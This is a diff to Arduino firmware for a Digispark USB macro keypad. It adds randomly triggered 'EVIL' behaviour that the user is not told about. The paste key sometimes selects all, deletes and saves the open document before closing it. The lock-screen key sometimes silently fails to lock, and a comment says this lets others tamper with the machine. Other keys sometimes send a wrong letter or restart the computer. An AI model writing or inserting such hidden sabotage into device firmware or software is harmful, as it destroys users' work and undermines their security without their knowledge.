@@ -13,11 +13,10 @@
 #define EVIL_D
 
 // chance: 1/x
-#define EVIL_A_CHANCE 1000
-#define EVIL_B_CHANCE 1000
-#define EVIL_C_CHANCE 1000
+#define EVIL_A_CHANCE 5
+#define EVIL_B_CHANCE 20
+#define EVIL_C_CHANCE 100
 #define EVIL_D_CHANCE 1000
-
 
 void keyPressA(void);
 void keyPressB(void);
@@ -84,19 +83,73 @@ void loop()
 
 void keyPressA(void)
 {
-  DigiKeyboard.sendKeyStroke(KEY_A);
+  #ifdef EVIL_A
+  if(random(EVIL_A_CHANCE) == 0)
+  {
+    DigiKeyboard.sendKeyStroke(KEY_B);
+  }
+  else
+  {
+  #endif
+    DigiKeyboard.sendKeyStroke(KEY_A);
+  #ifdef EVIL_A
+  }
+  #endif
 }
 
 void keyPressB(void)
 {
-  DigiKeyboard.sendKeyStroke(KEY_V , MOD_CONTROL_LEFT);
+  #ifdef EVIL_B
+  if(random(EVIL_B_CHANCE) == 0)
+  {
+    // Select everything, delete, save, close
+    DigiKeyboard.sendKeyStroke(KEY_A , MOD_CONTROL_LEFT);
+    DigiKeyboard.sendKeyStroke(KEY_DELETE);
+    DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);
+    DigiKeyboard.sendKeyStroke(KEY_F4 ,  MOD_ALT_LEFT);
+  }
+  else
+  {
+  #endif
+    DigiKeyboard.sendKeyStroke(KEY_V , MOD_CONTROL_LEFT);
+  #ifdef EVIL_A
+  }
+  #endif
 }
 
 void keyPressC(void)
 {
-  DigiKeyboard.sendKeyStroke(KEY_L , MOD_GUI_LEFT);
+  #ifdef EVIL_C
+  if(random(EVIL_C_CHANCE) == 0)
+  {
+    // nothing, don't lock the computer, letting others do nasty stuff to the computer
+  }
+  else
+  {
+  #endif
+    DigiKeyboard.sendKeyStroke(KEY_L , MOD_GUI_LEFT);
+  #ifdef EVIL_A
+  }
+  #endif
 }
 
 void keyPressD(void)
 {
-  DigiKeyboard.sendKeyStroke(KEY_DEL , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
+  #ifdef EVIL_A
+  if(random(EVIL_A_CHANCE) == 0)
+  {
+    // Restart computer
+    DigiKeyboard.sendKeyStroke(KEY_DELETE , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
+    DigiKeyboard.sendKeyStroke(KEY_UP);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.sendKeyStroke(KEY_UP);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  }
+  else
+  {
+  #endif
+    DigiKeyboard.sendKeyStroke(KEY_DELETE, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
+  #ifdef EVIL_A
+  }
+  #endif
+}
